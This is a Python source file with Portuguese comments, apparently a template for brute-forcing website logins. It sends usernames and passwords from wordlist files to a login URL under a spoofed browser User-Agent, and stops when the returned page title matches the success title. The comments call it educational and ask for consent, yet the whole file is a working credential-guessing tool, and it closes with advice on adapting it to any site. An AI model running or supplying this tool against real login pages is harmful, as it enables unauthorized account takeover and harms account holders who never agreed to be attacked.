# Este script de bruteforce é apenas um modelo e foi feito somente para fins educacionais,
# por favor não use isso contra outras pessoas sem o consentimento delas

import requests
from bs4 import BeautifulSoup
import sys

# O título da página quando o login for bem-sucedido vai aqui
# (para pegar o título, procure no HTML do site pela tag <title> dentro da tag <head>)

page_title = ''
url = ''

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'
}

def brute(username, password):

    data = {
        'username': username,
        'password': password
    }

    r = requests.post(
        url,
        data=data,
        headers=headers
    ).text

    soup = BeautifulSoup(
        r,
        'html.parser'
    )

    if soup.title.text == page_title:

        print('|===========================================================================|')

        print(
            f"          [+] Uma combinação foi encontrada com {username} : {password} [+]"
        )

        print('|===========================================================================|')

        print('\n')

        sys.exit()

    else:
        pass

def main():

    user_input = str(
        input(
            'Digite o usuário aqui, caso não tenha apenas pressione ENTER >> '
        ) or 'none'
    )

    if user_input == 'none':

        users = str(
            input(
                'Especifique um arquivo com usuários >> '
            )
        )

        passwords = str(
            input(
                'Especifique um arquivo com senhas >> '
            )
        )

        print('\n')

        passwords = [
            w.strip()
            for w in open(passwords, 'r').readlines()
        ]

        users = [
            u.strip()
            for u in open(users, 'r').readlines()
        ]

        user_index = 0
        pass_index = 0
        stop = 0

        # stop é uma variável que eu criei para parar quando não houver mais nomes de usuário,
        # caso contrário o código continuaria e geraria um erro IndexError

        while stop != len(users):

            brute(
                users[user_index],
                passwords[pass_index]
            )

            print(
                f'Tentado com >> {users[user_index]} : {passwords[pass_index]} \n'
            )

            pass_index += 1

            if pass_index == len(passwords):

                stop += 1
                pass_index = 0
                user_index += 1

    else:

        # Este else acontece quando o usuário especificou um nome de usuário

        passwords = str(
            input(
                'Especifique um arquivo com senhas >> '
            )
        )

        passwords = [
            w.strip()
            for w in open(passwords, 'r').readlines()
        ]

        for password in passwords:

            brute(
                user_input,
                password
            )

            print(
                f'Tentado com >> {user_input} : {password} \n'
            )

# Você precisará adaptar este script caso ele não funcione para algum site,
# lembre-se: cada site é diferente, mas o objetivo é encontrar uma forma
# de detectar quando o login foi bem-sucedido

main()